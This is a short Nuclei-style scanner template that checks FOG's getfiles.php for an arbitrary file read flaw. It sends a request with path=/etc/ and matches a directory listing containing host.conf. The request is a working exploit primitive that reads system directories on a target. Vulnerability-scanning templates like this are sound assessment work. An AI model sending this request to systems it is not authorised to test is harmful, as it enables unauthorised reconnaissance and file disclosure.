id: FOG-getfiles-ReadAnyFile

info:
  name: FOG-getfiles-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    FOG-getfiles-ReadAnyFile

http:
  - raw:
      - |
        GET /fog/status/getfiles.php?path=/etc/ HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest

    redirects: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\\/etc\\/"
          - "host.conf"
        condition: and